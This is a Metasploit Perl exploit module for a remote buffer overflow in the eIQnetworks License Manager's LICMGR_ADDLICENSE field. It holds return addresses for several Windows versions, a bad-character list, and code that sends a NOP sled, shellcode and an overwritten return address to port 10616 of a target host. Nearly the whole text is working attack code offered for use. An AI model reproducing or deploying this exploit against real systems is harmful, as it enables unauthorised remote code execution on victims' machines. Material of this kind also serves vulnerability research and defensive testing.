eIQnetworks License Manager Remote Buffer Overflow Exploit (494)
================================================================

#!/usr/bin/perl -w

#metasploit module for EIQ Licence manager overflow Provided by ri0t of Bastard Labs

package Msf::Exploit::EiQ_License_494; 
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	&#039;Name&#039;     => &#039;EIQ License Manager Overflow&#039;,
	&#039;Authors&#039;  => [ &#039;ri0t ri0t@ri0tnet.net, KF kf_list@digitalmunition.com&#039; ],

	&#039;Arch&#039;  => [ &#039;x86&#039; ],
	&#039;OS&#039;    => [ &#039;win32&#039;, &#039;win2000&#039;, &#039;winxp&#039; ],
	&#039;Priv&#039;  => 0,
	
	&#039;AutoOpts&#039;  => { &#039;EXITFUNC&#039; => &#039;seh&#039; },
	
	&#039;UserOpts&#039;  =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 10616],
	 },
        &#039;Payload&#039;  =>
	  {
		&#039;Space&#039; => 494,
		&#039;BadChars&#039;  => "\x00\x0a\x0d\x40\x26",
            },
          &#039;Description&#039;  =>  Pex::Text::Freeform(qq{
	This module exploits the buffer overflow found in the LICMGR_ADDLICENSE
        Field of EIQ networks network analyser this module exploits buffers of 494 bytes
	in size. This module should work on all EIQ branded analysers.  Exploitation
	assistance from KF.
        }),
          
          
        &#039;DefaultTarget&#039; => 1,
	&#039;Targets&#039; =>
	  [
		[&#039;Windows 2000 SP0-SP4 English&#039;, 0x750316e2],   # call ebx
		[&#039;Windows XP SP1/SP2 English&#039;, 0x77db64dc ],	# jmp ebx
	        [&#039;Windows Server 2003 SP0/SP1 English&#039;, 0x77d16764 ],   # jmp ebx 
	  ],
          
  };
  
  sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}
  
  sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_idx  = $self->GetVar(&#039;TARGET&#039;);
	my $shellcode   = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;
	my $target      = $self->Targets->[$target_idx];
        my $nops 	= $self->MakeNops(494 - length($shellcode));
        my $ret         =  pack("V", $target->[1]);
        my $evil        = "LICMGR_ADDLICENSE&" . $nops . $shellcode . $ret . "&";
	
            
        my $s = Msf::Socket::Tcp->new
	  (
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
    	  );
          
          if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}
          $self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using return address 0x%.8x....", $target->[1]));
          
          $s->Send("$evil");
          return;
  }


